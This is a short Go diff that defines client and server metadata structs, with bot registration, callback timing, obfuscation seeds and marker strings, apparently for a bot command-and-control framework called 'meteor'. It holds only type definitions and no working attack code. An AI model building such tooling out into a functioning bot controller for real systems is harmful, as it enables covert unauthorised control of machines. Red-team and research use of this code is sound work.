@@ -10,6 +10,14 @@ type Metclient struct {
 	regfile      string // location of bot registration file
 	interval     int    // bot callback interval
 	delta        int    // variation in callback time
-	obfseed      string // obfuscation seed integer
+	obfseed      int    // obfuscation seed integer
 	obftext      string // obfuscation seed text
+}
+// Metserver is a struct that holds the important server metadata
+type Metserver struct {
+	core         string // address:port of meteor core
+	magic        []byte // byte representation of the magicstring
+	magicstring  string // string representation of magicstring
+	magicterm    []byte // byte representation of magicterm
+	magictermstr string // string representation of magicterm
 }
